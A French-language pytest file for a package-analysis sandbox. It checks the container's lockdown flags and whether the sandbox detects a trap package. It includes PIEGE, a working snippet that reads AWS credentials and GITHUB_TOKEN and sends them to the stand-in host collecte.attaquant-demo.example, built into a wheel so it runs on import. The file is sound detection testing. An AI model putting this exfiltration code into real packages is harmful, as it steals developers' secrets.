"""Sandbox v1 : conteneur sans réseau réel, faux DNS/HTTP, leurres (docs/architecture.md § 5)."""

import shutil
import subprocess
import zipfile

import pytest

from plateforme import sandbox
from plateforme.sandbox import Ecosysteme


def test_le_conteneur_cible_est_verrouille():
    cmd = sandbox.commande_cible(nom="sas-cible-x", reseau="sas-sb-x", image="sas-sandbox:1",
                                 dossier="/tmp/sb", archive="p-1.0-py3-none-any.whl", module="p",
                                 attente_s=5, leurres={"AWS_SECRET_ACCESS_KEY": "s"})
    texte = " ".join(cmd)
    for option in ("--read-only", "--cap-drop ALL", "--security-opt no-new-privileges",
                   "--pids-limit 256", "--memory 1g", "--network sas-sb-x", "--user 10001:10001"):
        assert option in texte, option
    assert "--privileged" not in texte and "docker.sock" not in texte
    assert "/tmp/sb/entree:/entree:ro" in texte and "/tmp/sb/resolv.conf:/etc/resolv.conf:ro" in texte
    assert "AWS_SECRET_ACCESS_KEY=s" in texte


def test_npm_pas_encore(tmp_path):
    archive = tmp_path / "p-1.0.tgz"
    archive.write_bytes(b"x")
    with pytest.raises(NotImplementedError):
        sandbox.executer(Ecosysteme.NPM, archive, "p")


def test_le_stub_reste_disponible(tmp_path, monkeypatch):
    archive = tmp_path / "p-1.0-py3-none-any.whl"
    archive.write_bytes(b"x")
    monkeypatch.setenv("SAS_SANDBOX", "stub")
    assert sandbox.executer(Ecosysteme.PYPI, archive, "p").connexions == []


# --- avec un vrai Docker ----------------------------------------------------------------------

def _docker_ok() -> bool:
    if not shutil.which("docker"):
        return False
    return subprocess.run(["docker", "info"], capture_output=True).returncode == 0


avec_docker = pytest.mark.skipif(not _docker_ok(), reason="Docker indisponible")

PIEGE = '''
import base64, os, socket
cle = open(os.path.expanduser("~/.aws/credentials")).read()
jeton = os.environ.get("GITHUB_TOKEN", "")
try:
    s = socket.create_connection(("collecte.attaquant-demo.example", 80), timeout=5)
    s.sendall(b"POST /c HTTP/1.1\\r\\nHost: collecte.attaquant-demo.example\\r\\n\\r\\n"
              + base64.b64encode((cle + jeton).encode()))
    s.recv(100)
except OSError:
    pass
'''


def _roue(dossier, nom, code):
    chemin = dossier / f"{nom}-1.0-py3-none-any.whl"
    with zipfile.ZipFile(chemin, "w") as z:
        z.writestr(f"{nom}/__init__.py", code)
        z.writestr(f"{nom}-1.0.dist-info/METADATA", f"Metadata-Version: 2.1\nName: {nom}\nVersion: 1.0\n")
        z.writestr(f"{nom}-1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
        z.writestr(f"{nom}-1.0.dist-info/RECORD", "")
    return chemin


@pytest.mark.docker
@avec_docker
def test_un_paquet_sage_donne_un_rapport_propre(tmp_path, monkeypatch):
    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
    r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "sage", "VALEUR = 1\n"), "sage")
    assert (r.requetes_dns, r.connexions, r.fichiers_sensibles, r.leurres_lus, r.processus) == \
        ([], [], [], [], [])
    assert r.code_sortie == 0 and not r.delai_depasse


@pytest.mark.docker
@avec_docker
def test_un_paquet_piege_est_pris_la_main_dans_le_sac(tmp_path, monkeypatch):
    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
    r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "piege_demo", PIEGE), "piege_demo")
    assert "collecte.attaquant-demo.example" in r.requetes_dns
    assert "collecte.attaquant-demo.example:80" in r.connexions
    assert "~/.aws/credentials" in r.fichiers_sensibles
    assert "~/.aws/credentials" in r.leurres_lus
    assert "GITHUB_TOKEN (exfiltré)" in r.leurres_lus
    assert "~/.aws/credentials (exfiltré)" in r.leurres_lus
